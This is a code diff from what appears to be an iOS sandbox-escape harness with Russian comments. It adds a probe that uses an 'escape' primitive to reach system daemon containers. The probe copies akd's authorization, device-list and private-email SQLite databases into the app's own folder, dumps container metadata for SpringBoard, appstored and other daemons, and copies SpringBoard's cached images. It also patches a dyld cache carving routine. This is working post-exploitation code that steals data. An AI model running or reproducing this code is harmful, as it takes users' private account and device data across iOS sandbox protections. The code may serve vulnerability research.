@@ -47870,11 +47870,15 @@ static void p_bq115(void) {
         uint64_t filled = 0;
         for (NSString *sf in subs) {
             int sfd = open(sf.fileSystemRepresentation, O_RDONLY);
-            if (sfd < 0) continue;
+            if (sfd < 0) { LOG("[bq115]   sub %s: open errno %d",
+                              sf.lastPathComponent.UTF8String, errno); continue; }
             struct bq14_cache_header sh = {0};
             if (pread(sfd, &sh, sizeof(sh), 0) != sizeof(sh) ||
                 memcmp(sh.magic, "dyld_v1", 7) != 0 ||
                 sh.mappingCount > 64 || sh.mappingOffset > (1u << 20)) {
+                LOG("[bq115]   sub %s: header fail magic=%.7s mCnt=%u mOff=%u",
+                    sf.lastPathComponent.UTF8String, sh.magic,
+                    sh.mappingCount, sh.mappingOffset);
                 close(sfd); continue;
             }
             struct bq14_mapping_info mm[64];
@@ -47882,17 +47886,38 @@ static void p_bq115(void) {
             if (pread(sfd, mm, sh.mappingCount * sizeof(struct bq14_mapping_info),
                       sh.mappingOffset) !=
                 (ssize_t)(sh.mappingCount * sizeof(struct bq14_mapping_info))) {
+                LOG("[bq115]   sub %s: mapping pread FAIL (mCnt=%u mOff=%u)",
+                    sf.lastPathComponent.UTF8String, sh.mappingCount,
+                    sh.mappingOffset);
                 close(sfd); continue;
             }
+            BOOL covers = NO;
+            for (uint32_t m = 0; m < sh.mappingCount; m++) {
+                if (mm[m].address <= addr && addr < mm[m].address + mm[m].size) {
+                    covers = YES;
+                    LOG("[bq115]   sub %s ПОКРЫВАЕТ: map[%u] addr=%llu size=%llu foff=%llu",
+                        sf.lastPathComponent.UTF8String, m,
+                        (unsigned long long)mm[m].address,
+                        (unsigned long long)mm[m].size,
+                        (unsigned long long)mm[m].fileOffset);
+                    break;
+                }
+            }
+            (void)covers;
             for (uint32_t m = 0; m < sh.mappingCount; m++) {
                 uint64_t ma = mm[m].address, msz = mm[m].size,
                          mfo = mm[m].fileOffset;
-                if (ma < addr || ma >= addr + want) continue;
-                uint64_t rel = ma - addr;
-                uint64_t chunk = (rel + msz > want) ? (want - rel) : msz;
-                if (rel + chunk > want) chunk = want - rel;
+                // пересечение [ma, ma+msz) ∩ [addr, addr+want) — маппинг может
+                // начинаться ДО адреса образа (v274-баг: filled=0, magic=0)
+                if (ma + msz <= addr || ma >= addr + want) continue;
+                uint64_t i0 = (ma > addr) ? ma : addr;
+                uint64_t i1 = (ma + msz < addr + want) ? ma + msz : addr + want;
+                if (i1 <= i0) continue;
+                uint64_t rel = i0 - addr;
+                uint64_t chunk = i1 - i0;
                 unsigned char *tmp = (unsigned char *)malloc((size_t)chunk);
-                ssize_t got = pread(sfd, tmp, (size_t)chunk, (off_t)mfo);
+                ssize_t got = pread(sfd, tmp, (size_t)chunk,
+                                    (off_t)(mfo + (i0 - ma)));
                 if (got == (ssize_t)chunk) {
                     memcpy(buf + rel, tmp, (size_t)chunk);
                     filled += chunk;
@@ -47930,6 +47955,214 @@ static void p_bq115(void) {
     close(fd);
     bad_query_release(h);
     LOG("[bq115] ИТОГ: карвинг завершён");
+    fsync(fileno(stderr));
+}
+
+// p_bq116 — v275: akd SQLite-базы + sandbox-профиль из metadata + MappedImageCache.
+// akd-бинарь показал: /Library/Application Support/com.apple.akd/{authorization,
+// devicelist,privateEmails}.db — SQLite в контейнере (§267). Их листинг не был
+// виден в §265 (subdir com.apple.akd). Также: containermanagerd metadata plist
+// контейнера содержит SANDBOX PROFILE (ключ MCProfileMetadata? — дамп целиком).
+// И: содержимое вложенных дир MappedImageCache (PaperBoardUI, §265).
+static void p_bq116(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq116] v275: akd-базы + metadata-профили + MappedImageCache (§267)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq116] escape FAIL"); return; }
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    // === 1. akd Application Support/com.apple.akd/ ===
+    {
+        char adir[1100];
+        snprintf(adir, sizeof(adir),
+                 "/var/containers/Data/System/E8F726E1-00B6-4703-91D1-49267FC0F979"
+                 "/Library/Application Support");
+        DIR *dd = opendir(adir);
+        LOG("[bq116] akd AppSupport: %s", dd ? "ОТКРЫТ" : strerror(errno));
+        if (dd) {
+            struct dirent *de;
+            while ((de = readdir(dd))) {
+                if (de->d_name[0] == '.') continue;
+                char fp[1400];
+                snprintf(fp, sizeof(fp), "%s/%s", adir, de->d_name);
+                struct stat st = {0};
+                if (stat(fp, &st) == 0)
+                    LOG("[bq116]   %s: %lld байт%s", de->d_name,
+                        (long long)st.st_size, S_ISDIR(st.st_mode) ? " (dir)" : "");
+            }
+            closedir(dd);
+        }
+        // вложенный com.apple.akd
+        char sub[1400];
+        snprintf(sub, sizeof(sub), "%s/com.apple.akd", adir);
+        DIR *sd = opendir(sub);
+        if (sd) {
+            LOG("[bq116] akd/com.apple.akd/:");
+            struct dirent *se;
+            while ((se = readdir(sd))) {
+                if (se->d_name[0] == '.') continue;
+                char fp[1700];
+                snprintf(fp, sizeof(fp), "%s/%s", sub, se->d_name);
+                struct stat st = {0};
+                if (stat(fp, &st) == 0) {
+                    LOG("[bq116]   %s: %lld байт uid=%d mtime=%ld", se->d_name,
+                        (long long)st.st_size, st.st_uid, (long)st.st_mtime);
+                    if (S_ISREG(st.st_mode) && st.st_size > 0 && st.st_size < 3000000) {
+                        FILE *f = fopen(fp, "rb");
+                        if (f) {
+                            char out[600];
+                            snprintf(out, sizeof(out), "%s/akd-%s",
+                                     docs.fileSystemRepresentation, se->d_name);
+                            FILE *o = fopen(out, "wb");
+                            if (o) { char buf[65536]; size_t r; unsigned long t2=0;
+                                while ((r = fread(buf,1,sizeof(buf),f))>0){fwrite(buf,1,r,o);t2+=r;}
+                                fclose(o);
+                                LOG("[bq116]     copied %lu -> akd-%s", t2, se->d_name);
+                            }
+                            fclose(f);
+                        }
+                    }
+                }
+            }
+            closedir(sd);
+        } else LOG("[bq116] com.apple.akd subdir: %s", strerror(errno));
+        fsync(fileno(stderr));
+    }
+
+    // === 2. containermanagerd metadata контейнеров (SANDBOX PROFILE) ===
+    {
+        static const char *conts[] = {
+            "E8F726E1-00B6-4703-91D1-49267FC0F979",  // akd
+            "867912A4-A70D-428C-9551-D28453B6F1B4",  // backboardd
+            "AF589EEA-A5CE-42E9-B955-96B9234C5A85",  // lsd
+            "D751CF7C-BB34-4A31-9D9A-D8DA5EBF4DEB",  // springboard
+            "3E27999E-F441-4625-A423-AF11E87F71E8",  // appstored
+        };
+        static const char *names[] = { "akd", "backboardd", "lsd", "springboard", "appstored" };
+        for (unsigned i = 0; i < 5; i++) {
+            // metadata живёт в .containers? Ищем в корне контейнера и в
+            // /var/containers/Data/System/<uuid>/.com.apple.containermanagerd?
+            static const char *cands[] = {
+                "/var/containers/Data/System/%s/.com.apple.containermanagerd.metadata.plist",
+                "/var/containers/Data/System/%s/com.apple.containermanagerd.metadata.plist",
+                "/var/lib/containers/Shared/%s/metadata.plist",
+            };
+            for (unsigned c = 0; c < sizeof(cands)/sizeof(cands[0]); c++) {
+                char fp[1400];
+                snprintf(fp, sizeof(fp), cands[c], conts[i]);
+                FILE *f = fopen(fp, "rb");
+                if (!f) continue;
+                fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
+                if (sz <= 0 || sz > 128*1024) { fclose(f); continue; }
+                NSMutableData *data = [NSMutableData dataWithLength:(NSUInteger)sz];
+                if (fread(data.mutableBytes, 1, (size_t)sz, f) != (size_t)sz) { fclose(f); continue; }
+                fclose(f);
+                CFErrorRef err = NULL;
+                CFPropertyListRef pl = CFPropertyListCreateWithData(
+                    NULL, (__bridge CFDataRef)data, kCFPropertyListImmutable, NULL, &err);
+                if (!pl) { LOG("[bq116] %s metadata[%u]: parse FAIL", names[i], c); continue; }
+                LOG("[bq116] %s metadata[%u] (%s):", names[i], c, strstr(fp, "System") ? "in-container" : "lib");
+                // дамп верхнего уровня
+                if (CFGetTypeID(pl) == CFDictionaryGetTypeID()) {
+                    CFIndex n = CFDictionaryGetCount((CFDictionaryRef)pl);
+                    const void **keys = malloc(sizeof(void *) * (size_t)n);
+                    const void **vals = malloc(sizeof(void *) * (size_t)n);
+                    CFDictionaryGetKeysAndValues((CFDictionaryRef)pl, keys, vals);
+                    for (CFIndex k = 0; k < n && k < 30; k++) {
+                        char kb[256] = {0}, vb[512] = {0};
+                        if (CFGetTypeID(keys[k]) == CFStringGetTypeID())
+                            CFStringGetCString((CFStringRef)keys[k], kb, sizeof(kb), kCFStringEncodingUTF8);
+                        CFTypeRef v = vals[k];
+                        if (CFGetTypeID(v) == CFStringGetTypeID())
+                            CFStringGetCString((CFStringRef)v, vb, sizeof(vb), kCFStringEncodingUTF8);
+                        else if (CFGetTypeID(v) == CFBooleanGetTypeID())
+                            snprintf(vb, sizeof(vb), "%s",
+                                     v == kCFBooleanTrue ? "true" : "false");
+                        else if (CFGetTypeID(v) == CFNumberGetTypeID()) {
+                            long long lv = 0; CFNumberGetValue((CFNumberRef)v, kCFNumberLongLongType, &lv);
+                            snprintf(vb, sizeof(vb), "%lld", lv);
+                        } else snprintf(vb, sizeof(vb), "(%s)", CFGetTypeID(v) == CFDictionaryGetTypeID() ? "dict" :
+                                       CFGetTypeID(v) == CFArrayGetTypeID() ? "array" : "?");
+                        LOG("[bq116]   %s = %s", kb, vb);
+                    }
+                    free(keys); free(vals);
+                }
+                CFRelease(pl);
+            }
+        }
+        fsync(fileno(stderr));
+    }
+
+    // === 3. MappedImageCache вложенное содержимое ===
+    {
+        char pbc[1100];
+        snprintf(pbc, sizeof(pbc),
+                 "/var/containers/Data/System/D751CF7C-BB34-4A31-9D9A-D8DA5EBF4DEB"
+                 "/Library/Caches/com.apple.PaperBoardUI/PBUIMappedImageCacheManager-Default");
+        DIR *dd = opendir(pbc);
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 3) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                char sub[2400];
+                snprintf(sub, sizeof(sub), "%s/%s", pbc, de->d_name);
+                DIR *sd = opendir(sub);
+                if (!sd) continue;
+                struct dirent *se;
+                while ((se = readdir(sd))) {
+                    if (se->d_name[0] == '.') continue;
+                    char sub2[2900];
+                    snprintf(sub2, sizeof(sub2), "%s/%s", sub, se->d_name);
+                    DIR *s2 = opendir(sub2);
+                    if (!s2) {
+                        struct stat st2 = {0};
+                        if (stat(sub2, &st2) == 0)
+                            LOG("[bq116] mapped-file %s: %lld байт", se->d_name,
+                                (long long)st2.st_size);
+                        continue;
+                    }
+                    struct dirent *s2e; int c3 = 0;
+                    while ((s2e = readdir(s2)) && c3 < 16) {
+                        if (s2e->d_name[0] == '.') continue;
+                        c3++;
+                        char fp[3300];
+                        snprintf(fp, sizeof(fp), "%s/%s", sub2, s2e->d_name);
+                        struct stat st3 = {0};
+                        if (stat(fp, &st3) == 0) {
+                            LOG("[bq116]   %s/%s: %lld байт uid=%d", se->d_name,
+                                s2e->d_name, (long long)st3.st_size, st3.st_uid);
+                            if (c3 == 1 && S_ISREG(st3.st_mode) && st3.st_size > 0 &&
+                                st3.st_size < 8000000) {
+                                FILE *f = fopen(fp, "rb");
+                                if (f) {
+                                    char out[600];
+                                    snprintf(out, sizeof(out), "%s/sb-mapped-img",
+                                             docs.fileSystemRepresentation);
+                                    FILE *o = fopen(out, "wb");
+                                    if (o) { char buf[65536]; size_t r; unsigned long t2=0;
+                                        while ((r = fread(buf,1,sizeof(buf),f))>0){fwrite(buf,1,r,o);t2+=r;}
+                                        fclose(o);
+                                        LOG("[bq116]     copied %lu -> sb-mapped-img", t2);
+                                    }
+                                    fclose(f);
+                                }
+                            }
+                        }
+                    }
+                    closedir(s2);
+                }
+                closedir(sd);
+            }
+            closedir(dd);
+        }
+        fsync(fileno(stderr));
+    }
+
+    bad_query_release(h);
+    LOG("[bq116] ИТОГ: akd-базы + профили + mapped собраны");
     fsync(fileno(stderr));
 }
 
@@ -56562,6 +56795,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ113")) { p_bq113(); LOG("[probe13] bq113-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ114")) { p_bq114(); LOG("[probe13] bq114-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ115")) { p_bq115(); LOG("[probe13] bq115-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ116")) { p_bq116(); LOG("[probe13] bq116-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
